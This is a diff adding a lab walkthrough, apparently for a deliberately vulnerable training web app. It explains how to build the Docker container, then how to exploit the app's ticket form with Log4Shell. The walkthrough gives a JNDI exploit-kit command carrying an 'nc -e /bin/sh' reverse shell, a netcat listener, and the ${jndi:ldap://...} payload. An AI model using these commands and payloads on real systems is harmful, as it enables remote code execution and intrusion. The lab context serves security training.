@@ -1,0 +1,30 @@
+If you are hosting the application, you must first build the docker-container. Otherwise you can skip this section.
+First, run the command "docker-compose build" without the quotation marks. This will build the container using the docker-compose configuration file.
+When the container is built, run the command "docker-compose up" to start the container. You should see a lot of output in the terminal. 
+Once the terminal is not printing anymore lines, you shloud be able to visit the webpage. Try entering "localhost:8080" into the search bar of your browser.
+
+
+
+You can go to the webapplication by typing in localhost:8080 if you are hosting the application on your own system.
+Otherwise, find the local IP address of the machine hosting the web application by running the command ipconfig or ip a on the host system. Ensure you are on the same local network.
+
+First you must gain access to the tickets page on the webapplication. The easiest way to do this is to follow the url in the robots.txt file hosted on the webapplication. The robots.txt file can be found by searching for the url http://<webapp.ip.here>:8080/robots.txt.
+
+After gaining access to the tickets directory, you can submit a ticket. The ticket will be processed by log4j, meaning you can perform log4shell on the vulnerable server.
+The easiest way to do this is via the provided jar named "JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar".
+
+Simply type the command "java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "nc <IP> <PORT> -e /bin/sh" -A <IP>" without the outer quotation marks and you should be good to go.
+Normally we would have to host a LDAP/RMI and HTTP server, but the JNDI exploit kit does all that for us. The -C flag is used to tell the program what command we want log4j to run, and the -A flag
+is used to tell the program which IP we want to host our servers on. 
+
+At the same time, use the command "nc -lvnp <PORT>" using the same port as in the above command. This will launch a listener we will use to listen for incoming connections. 
+
+Alternatively, you can use your favorite text editor to edit the helperscript, adding your IP and port, before running it with the command ./helperScript
+
+This will do the same as running the above commands individually, but if you are not confident in the command line yet, you can use this small script to ensure the commands are running correctly.
+
+The JNDI-Exploit-Kit will give you some urls to use. Use the ldap one for programs that have been built with java 1.8+.
+
+On the tickets page, add a ticket with the content ${jndi:ldap://<your-exploit-url-here>} and press submit ticket.
+
+On the tab with the nc listener you should now have recieved a new connection, meaning you exploited log4j successfully. 
